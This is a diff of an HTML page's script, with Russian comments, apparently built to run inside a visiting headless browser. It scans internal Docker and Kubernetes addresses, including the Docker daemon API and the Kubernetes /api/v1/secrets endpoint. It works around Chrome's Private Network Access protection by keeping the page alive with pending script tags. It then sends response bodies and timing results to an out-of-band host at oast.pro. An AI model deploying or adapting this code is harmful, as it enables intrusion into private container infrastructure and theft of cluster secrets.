@@ -7,67 +7,65 @@ var OOB = 'd9j2sgb6b8m92s73q8v0ixyk7io8j763i.oast.pro';
 function fire(path) {
   new Image().src = 'https://' + OOB + path + '&r=' + Math.random();
 }
+fire('/alive12?t=0');
 
-fire('/alive11?t=0');
-
-// Гипотеза: Chrome PNA не применяет OPTIONS-preflight к <img> и <script> тегам
-// (в отличие от CORS fetch).
-// Если img-err за 50-500мс → сервер ответил (PNA обойден для img)!
-// Если img-err за 8-10мс → PNA блокирует img так же как fetch
-// Если img-to → timeout (TCP open, но HTTP не ответил)
-
-function imgProbe(label, url, ms) {
-  var img = document.createElement('img');
-  var t0 = Date.now();
-  var done = false;
-  function rep(tag) {
-    if (done) return; done = true;
-    fire('/ig-' + tag + '-' + label + '?ms=' + (Date.now() - t0));
-  }
-  img.onload  = function() { rep('ok'); };
-  img.onerror = function() { rep('er'); };
-  img.src = url;
-  setTimeout(function() { rep('to'); }, ms);
-}
-
-// Ключевой тест: Docker daemon API (port 2375)
-// _ping возвращает "OK" быстро — если img-er за ~100мс → Docker ответил, PNA обойден
-imgProbe('docker-ping',  'http://172.17.0.1:2375/_ping',       3000);
-imgProbe('docker-info',  'http://172.17.0.1:2375/info',        3000);
-imgProbe('docker-cont',  'http://172.17.0.1:2375/containers/json', 3000);
-
-// Возможный Portainer/Prometheus UI — если HTML → img загрузится? нет, но timing важен
-imgProbe('port-9090',    'http://172.17.0.1:9090/',            3000);
-imgProbe('svc-8080',     'http://172.17.0.1:8080/',            3000);
-imgProbe('reg-5000',     'http://172.17.0.1:5000/',            3000);
-
-// Контейнеры: сканируем .2 .3 .4 .5 .6 .7 .8
-imgProbe('c2-80',   'http://172.17.0.2/',       2000);
-imgProbe('c2-8080', 'http://172.17.0.2:8080/',  2000);
-imgProbe('c3-80',   'http://172.17.0.3/',       2000);
-imgProbe('c3-8080', 'http://172.17.0.3:8080/',  2000);
-imgProbe('c4-80',   'http://172.17.0.4/',       2000);
-imgProbe('c4-8080', 'http://172.17.0.4:8080/',  2000);
-imgProbe('c5-80',   'http://172.17.0.5/',       2000);
-imgProbe('c6-80',   'http://172.17.0.6/',       2000);
-imgProbe('c7-80',   'http://172.17.0.7/',       2000);
-imgProbe('c8-80',   'http://172.17.0.8/',       2000);
-
-// <script> тег — третий тип subresource, другое поведение PNA?
-function scProbe(label, url) {
+// <script> тег к приватным IP держит страницу живой ~20с (доказано v11: sc-er?ms=19800)
+// Добавляем их первыми — страница не закроется пока они pending
+function keepAlive(url) {
   var s = document.createElement('script');
-  var t0 = Date.now();
-  var done = false;
-  function rep(tag) { if (done) return; done=true; fire('/sc-'+tag+'-'+label+'?ms='+(Date.now()-t0)); }
-  s.onload  = function() { rep('ok'); };
-  s.onerror = function() { rep('er'); };
   s.src = url;
   document.head.appendChild(s);
 }
+keepAlive('http://172.17.0.1:2375/_ping');  // Docker API
+keepAlive('http://172.17.0.1:9090/');       // Prometheus/Portainer?
 
-scProbe('docker-ping', 'http://172.17.0.1:2375/_ping');
-scProbe('port-9090',   'http://172.17.0.1:9090/');
-scProbe('c2-80',       'http://172.17.0.2/');
+// Теперь у нас ~20с. Запускаем CORS fetch с длинным таймаутом.
+// cf-ok  = сервер ответил И CORS позволил читать → читаем тело (data!)
+// cf-err = сервер ответил но CORS заблокировал → сервер существует
+// cf-to  = сервер не ответил на OPTIONS/GET в отведённое время
+
+function cf(label, url, ms) {
+  var t0 = Date.now();
+  fetch(url, {mode: 'cors', credentials: 'omit', signal: AbortSignal.timeout(ms)})
+    .then(function(r) {
+      return r.text().then(function(b) {
+        fire('/cf-ok-' + label + '?ms=' + (Date.now()-t0)
+          + '&s=' + r.status + '&b=' + encodeURIComponent(b.slice(0, 400)));
+      });
+    })
+    .catch(function(e) {
+      var el = Date.now() - t0;
+      fire('/cf-' + (el >= ms-200 ? 'to' : 'err') + '-' + label
+        + '?ms=' + el + '&e=' + encodeURIComponent(e.message.slice(0, 80)));
+    });
+}
+
+// k8s API insecure port 8080 — первый раз с достаточным таймаутом
+cf('k8s-ver',      'http://10.96.0.1:8080/version',                          15000);
+cf('k8s-api',      'http://10.96.0.1:8080/api',                              15000);
+cf('k8s-secrets',  'http://10.96.0.1:8080/api/v1/secrets',                   15000);
+cf('k8s-nodes',    'http://10.96.0.1:8080/api/v1/nodes',                     15000);
+cf('k8s-pods',     'http://10.96.0.1:8080/api/v1/pods',                      15000);
+
+// Docker API — с достаточным таймаутом
+cf('dapi-ping',    'http://172.17.0.1:2375/_ping',                           15000);
+cf('dapi-info',    'http://172.17.0.1:2375/info',                            15000);
+cf('dapi-cont',    'http://172.17.0.1:2375/containers/json',                 15000);
+cf('dapi-img',     'http://172.17.0.1:2375/images/json',                     15000);
+
+// Сервисы на 172.17.0.1
+cf('svc-9090',     'http://172.17.0.1:9090/',                                15000); // Prometheus/Portainer
+cf('svc-8080',     'http://172.17.0.1:8080/',                                15000);
+cf('svc-5000',     'http://172.17.0.1:5000/',                                15000);
+
+// Контейнеры — порты 80 и 8080
+cf('c2-80',        'http://172.17.0.2/',                                     15000);
+cf('c2-8080',      'http://172.17.0.2:8080/',                                15000);
+cf('c3-80',        'http://172.17.0.3/',                                     15000);
+cf('c3-8080',      'http://172.17.0.3:8080/',                                15000);
+cf('c4-80',        'http://172.17.0.4/',                                     10000);
+cf('c5-80',        'http://172.17.0.5/',                                     10000);
+cf('c6-80',        'http://172.17.0.6/',                                     10000);
 </script>
 </body>
 </html>
